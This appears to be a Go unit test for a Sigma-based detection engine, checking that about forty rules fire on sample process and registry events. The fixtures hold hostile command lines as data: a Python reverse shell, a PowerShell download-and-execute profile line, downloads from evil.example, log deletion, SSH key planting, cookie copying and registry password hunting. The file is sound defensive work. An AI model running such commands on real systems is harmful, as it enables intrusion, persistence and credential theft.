package detection

import "testing"

// TestNewBuiltinRulesFire verifies the newly added detections fire on
// representative telemetry, exercised through the real flatten+alias+evaluate
// path (including the registry TargetObject value-name append that the Winlogon
// rule depends on).
func TestNewBuiltinRulesFire(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	fires := func(title string, event map[string]interface{}) bool {
		addPipelineSigmaAliases(event)
		for _, m := range ev.EvaluateEvent(event) {
			if m.RuleTitle == title {
				return true
			}
		}
		return false
	}

	cases := []struct {
		ruleTitle string
		event     map[string]interface{}
	}{
		{
			"BITS Job Abuse for Download or Persistence",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\bitsadmin.exe`,
				"command_line": `bitsadmin /transfer job https://evil.example/p.exe C:\Users\Public\p.exe`,
			},
		},
		{
			"Accessibility Feature Backdoor (Sticky Keys)",
			map[string]interface{}{
				"type":              "process",
				"parent_image_path": `C:\Windows\System32\sethc.exe`,
				"image_path":        `C:\Windows\System32\cmd.exe`,
				"command_line":      `cmd.exe`,
			},
		},
		{
			"Winlogon Helper Persistence (Shell/Userinit)",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`,
				"value_name": "Shell",
				"value_data": `explorer.exe,C:\Users\Public\evil.exe`,
				"operation":  "modify",
			},
		},
		{
			"Security Software Discovery",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\tasklist.exe`,
				"command_line": `tasklist /svc | findstr msmpeng`,
			},
		},
		{
			"Netsh Helper DLL Persistence",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\netsh.exe`,
				"command_line": `netsh add helper C:\Users\Public\evil.dll`,
			},
		},
		{
			"PsExec Service Execution",
			map[string]interface{}{
				"type":       "process",
				"image_path": `C:\Windows\PSEXESVC.exe`,
			},
		},
		{
			"At.exe Legacy Job Scheduling",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\at.exe`,
				"command_line": `at 09:00 /interactive cmd.exe /c C:\Users\Public\run.bat`,
			},
		},
		{
			"System Log Clearing (Linux/macOS)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/rm",
				"command_line": "rm -rf /var/log/auth.log /var/log/syslog",
			},
		},
		{
			"Setuid/Setgid Permission Modification (Linux/macOS)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/chmod",
				"command_line": "chmod u+s /tmp/rootshell",
			},
		},
		{
			"Office Application Spawning a Script Interpreter",
			map[string]interface{}{
				"type":              "process",
				"parent_image_path": `C:\Program Files\Microsoft Office\root\Office16\winword.exe`,
				"image_path":        `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				"command_line":      `powershell -enc ZQB2AGkAbAA=`,
			},
		},
		{
			"Kernel Module Loading (Linux)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/sbin/insmod",
				"command_line": "insmod /tmp/rootkit.ko",
			},
		},
		{
			"Privileged or Host-Escape Container Deployment",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/docker",
				"command_line": "docker run --privileged -v /:/host alpine sh",
			},
		},
		{
			"Container Administration Command Execution",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/kubectl",
				"command_line": "kubectl exec -it victim-pod -- /bin/bash",
			},
		},
		{
			"Process Memory Credential Access via /proc (Linux)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/dd",
				"command_line": "dd if=/proc/1234/mem bs=1 skip=140000000 count=1000",
			},
		},
		{
			"Tor Anonymity Client Execution",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Users\v\AppData\Local\Temp\tor.exe`,
				"command_line": `tor.exe -f torrc`,
			},
		},
		{
			"Browser Cookie or Login Database Access",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\esentutl.exe`,
				"command_line": `esentutl /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies" /d cookies.bak`,
			},
		},
		{
			"RC Script Persistence (Linux)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/bin/sh",
				"command_line": "sh -c 'echo /tmp/implant >> /etc/rc.local'",
			},
		},
		{
			"Systemd Timer Persistence (Linux)",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/systemctl",
				"command_line": "systemctl enable evil.timer",
			},
		},
		{
			"Startup Folder Persistence",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\cmd.exe`,
				"command_line": `cmd /c copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"`,
			},
		},
		{
			"Verclsid COM Object Proxy Execution",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\verclsid.exe`,
				"command_line": `verclsid.exe /S /C {ABCDEF01-2345-6789-ABCD-EF0123456789}`,
			},
		},
		{
			"Registry Credential Hunting",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\reg.exe`,
				"command_line": `reg query HKLM /f password /t REG_SZ /s`,
			},
		},
		{
			"Compile After Delivery",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/gcc",
				"command_line": "gcc /tmp/dropper.c -o /tmp/implant",
			},
		},
		{
			"PowerShell Profile Persistence",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				"command_line": `powershell Add-Content $PROFILE 'IEX(New-Object Net.WebClient).DownloadString("http://evil/")' ; gc Microsoft.PowerShell_profile.ps1`,
			},
		},
		{
			"Suspicious Python One-Liner Execution",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/python3",
				"command_line": `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));pty.spawn("/bin/sh")'`,
			},
		},
		{
			"SSH Authorized Keys Modification",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/bin/sh",
				"command_line": `sh -c "echo 'ssh-rsa AAAAB3Nz attacker' >> /home/victim/.ssh/authorized_keys"`,
			},
		},
		{
			"PAM Configuration or Module Tampering",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/tee",
				"command_line": "tee -a /etc/pam.d/sshd",
			},
		},
		{
			"macOS Login or Logout Hook Persistence",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/defaults",
				"command_line": "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
			},
		},
		{
			"AppleScript Elevated Execution Prompt",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/osascript",
				"command_line": `osascript -e 'do shell script "id" with administrator privileges'`,
			},
		},
		{
			"macOS Hidden Account Creation via dscl",
			map[string]interface{}{
				"type":         "process",
				"image_path":   "/usr/bin/dscl",
				"command_line": "dscl . -create /Users/_support IsHidden 1",
			},
		},
		{
			"COM Object Hijacking via Suspicious Server Path",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKU\S-1-5-21-1\SOFTWARE\Classes\CLSID\{0006F03A-0000-0000-C000-000000000046}\InprocServer32`,
				"value_data": `C:\Users\v\AppData\Local\Temp\evil.dll`,
				"operation":  "modify",
			},
		},
		{
			"LSA Authentication Package or Password Filter Registration",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`,
				"value_name": "Notification Packages",
				"value_data": `scecli\0rassfm\0evilflt`,
				"operation":  "modify",
			},
		},
		{
			"AppCert DLL Persistence",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls`,
				"value_name": "hook",
				"value_data": `C:\ProgramData\hook.dll`,
				"operation":  "create",
			},
		},
		{
			"AppInit DLL Persistence",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`,
				"value_name": "AppInit_DLLs",
				"value_data": `C:\Users\Public\inj.dll`,
				"operation":  "modify",
			},
		},
		{
			"Msiexec Remote or UNC Package Execution",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\msiexec.exe`,
				"command_line": `msiexec /i https://evil.example/payload.msi /qn`,
			},
		},
		{
			"Application Shim Database Installation",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\sdbinst.exe`,
				"command_line": `sdbinst -q C:\Users\Public\evil.sdb`,
			},
		},
		{
			"MMC Spawning a Command Shell",
			map[string]interface{}{
				"type":              "process",
				"parent_image_path": `C:\Windows\System32\mmc.exe`,
				"image_path":        `C:\Windows\System32\cmd.exe`,
				"command_line":      `cmd /c whoami`,
			},
		},
		{
			"SQL Server Spawning a Command Shell",
			map[string]interface{}{
				"type":              "process",
				"parent_image_path": `C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe`,
				"image_path":        `C:\Windows\System32\cmd.exe`,
				"command_line":      `cmd /c "powershell -enc ..."`,
			},
		},
		{
			"Web Server Process Spawning a Shell",
			map[string]interface{}{
				"type":              "process",
				"parent_image_path": "/usr/sbin/apache2",
				"image_path":        "/bin/sh",
				"command_line":      "sh -c 'id; uname -a'",
			},
		},
		{
			"Active Setup Installed Components Persistence",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{EDR-1234}`,
				"value_name": "StubPath",
				"value_data": `C:\Users\Public\evil.exe`,
				"operation":  "modify",
			},
		},
		{
			"Service ImagePath or ServiceDll Hijack to Suspicious Path",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc`,
				"value_name": "ImagePath",
				"value_data": `C:\Users\Public\implant.exe`,
				"operation":  "modify",
			},
		},
		{
			"Windows Load or Run Value Persistence",
			map[string]interface{}{
				"type":       "registry",
				"key_path":   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`,
				"value_name": "Load",
				"value_data": `C:\Users\Public\loader.exe`,
				"operation":  "modify",
			},
		},
		{
			"Indirect Command Execution via Trusted Utility",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\forfiles.exe`,
				"command_line": `forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"`,
			},
		},
		{
			"Local Administrators Group Addition via net.exe",
			map[string]interface{}{
				"type":         "process",
				"image_path":   `C:\Windows\System32\net.exe`,
				"command_line": `net localgroup administrators attacker /add`,
			},
		},
	}

	for _, c := range cases {
		t.Run(c.ruleTitle, func(t *testing.T) {
			if !fires(c.ruleTitle, c.event) {
				t.Errorf("rule %q did not fire on %+v", c.ruleTitle, c.event)
			}
		})
	}
}
